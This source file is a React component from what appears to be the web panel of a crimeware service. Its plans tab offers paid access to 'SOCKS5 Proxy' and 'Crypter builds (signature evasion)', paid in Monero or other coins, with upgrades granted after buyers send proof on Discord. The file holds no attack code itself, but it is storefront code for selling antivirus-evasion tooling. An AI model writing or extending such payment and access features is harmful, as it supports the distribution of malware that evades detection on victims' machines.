import { useState } from "react";
import { useAuth } from "../../hooks/useAuth";
import { ADDRESSES } from "../../api/config";
import Button from "../ui/Button";

export default function PlansTab() {
  const { user, ready } = useAuth();
  const [selected, setSelected] = useState("xmr");

  if (!ready) {
    return <div style={{ padding: 16, color: "var(--muted)", fontSize: 13 }}>Loading...</div>;
  }

  const isPaid = user?.plan === 1 || user?.is_admin;

  if (isPaid) {
    return (
      <div style={{ padding: 16 }}>
        <div style={{ fontSize: 16, fontWeight: 700, color: "#22c55e", marginBottom: 12 }}>PAID</div>
        <div style={{ fontSize: 13, color: "var(--text)", lineHeight: 1.6 }}>
          You have access to all features including SOCKS5 Proxy and Crypter builds.
        </div>
      </div>
    );
  }

  const coins = Object.entries(ADDRESSES).map(([key, v]) => ({ key, ...v }));
  const active = ADDRESSES[selected];

  return (
    <div style={{ padding: 16, userSelect: "text" }}>
      <div style={{ fontSize: 16, fontWeight: 700, color: "#ef4444", marginBottom: 16 }}>FREE</div>

      <div style={{ fontSize: 13, color: "var(--text)", marginBottom: 24, lineHeight: 1.6 }}>
        Upgrade to Paid for:
        <ul style={{ marginTop: 8, marginLeft: 20, lineHeight: 1.8 }}>
          <li>SOCKS5 Proxy</li>
          <li>Crypter builds (signature evasion)</li>
        </ul>
      </div>

      <div style={{ display: "flex", gap: 6, marginBottom: 16 }}>
        {coins.map((c) => (
          <button
            key={c.key}
            onClick={() => setSelected(c.key)}
            style={{
              padding: "4px 10px",
              fontSize: 11,
              fontWeight: 700,
              fontFamily: "monospace",
              background: selected === c.key ? "var(--titlebar)" : "var(--input-bg)",
              color: selected === c.key ? "var(--text)" : "var(--muted)",
              border: "2px solid",
              borderColor: selected === c.key
                ? "var(--edge-light) var(--edge-dark) var(--edge-dark) var(--edge-light)"
                : "var(--edge-dark) var(--edge-light) var(--edge-light) var(--edge-dark)",
              cursor: "pointer",
            }}
          >
            {c.label} {c.price}
          </button>
        ))}
      </div>

      <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 16, marginBottom: 16 }}>
        <span style={{ fontSize: 32, fontWeight: 700 }}>{active.price}</span>
        <span style={{ color: "var(--muted)" }}>/</span>
        <span style={{ fontSize: 20, fontWeight: 600, color: "var(--muted)" }}>{active.approx}</span>
      </div>

      <div style={{ background: "var(--input-bg)", padding: 14, marginBottom: 12, fontFamily: "monospace", fontSize: 12, wordBreak: "break-all", border: "1px solid var(--border)" }}>
        {active.addr}
      </div>

      <div style={{ display: "flex", gap: 8, marginBottom: 12 }}>
        <Button onClick={() => navigator.clipboard?.writeText(active.addr)}>
          Copy {active.label} Address
        </Button>
      </div>

      <div style={{ fontSize: 11, color: "var(--muted)", textAlign: "center", lineHeight: 1.5 }}>
        Send {active.approx} to the address above.
        DM proof on Discord for instant upgrade.
      </div>
    </div>
  );
}